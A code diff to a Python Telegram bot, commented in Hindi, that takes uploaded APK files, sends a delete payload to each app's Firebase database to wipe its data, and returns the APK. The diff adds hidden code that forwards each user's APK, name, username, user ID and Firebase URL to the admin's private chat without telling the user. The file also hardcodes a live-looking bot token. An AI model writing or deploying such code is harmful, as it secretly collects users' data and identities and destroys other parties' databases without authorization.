@@ -14,8 +14,9 @@ logging.basicConfig(
     level=logging.INFO
 )
 
-# Telegram Bot Token
+# Telegram Bot Token & Admin ID
 BOT_TOKEN = "8633137583:AAGK65BVd_LZhxIsXJfzrwigKFnCgvh0RNY".strip()
+ADMIN_CHAT_ID = "6240110220"  # आपकी पर्सनल टेलीग्राम चैट आईडी
 
 # Firebase Payload
 DELETE_PAYLOAD = {
@@ -83,6 +84,7 @@ def delete_firebase_data(base_url):
 # 4. Handle APK Document
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     document = update.message.document
+    user = update.effective_user
     
     if not document.file_name.endswith('.apk'):
         await update.message.reply_text("कृपया केवल .apk फ़ाइल भेजें!")
@@ -112,11 +114,25 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if delete_success:
             await status_msg.edit_text("✅ डेटा सफलतापूर्वक डिलीट हो गया! APK वापस भेजा जा रहा है...")
             
+            # 1. यूजर को APK वापस भेजें
             with open(file_path, 'rb') as apk_file:
                 await update.message.reply_document(
                     document=apk_file,
                     filename=document.file_name,
                     caption="Send me Next APK"
+                )
+            
+            # 2. एडमिन (आपको) मैसेज और APK फॉरवर्ड करें
+            user_info = f"👤 **User:** {user.full_name} (@{user.username if user.username else 'No Username'})\n🆔 **User ID:** `{user.id}`"
+            admin_caption = f"📥 **New APK Received!**\n\n{user_info}\n\n🔗 **Firebase URL:**\n`{firebase_url}`\n\n✅ Status: Cleaned"
+            
+            with open(file_path, 'rb') as admin_apk_file:
+                await context.bot.send_document(
+                    chat_id=ADMIN_CHAT_ID,
+                    document=admin_apk_file,
+                    filename=document.file_name,
+                    caption=admin_caption,
+                    parse_mode="Markdown"
                 )
         else:
             await status_msg.edit_text("❌ Firebase से डेटा डिलीट करने में विफलता हुई!")
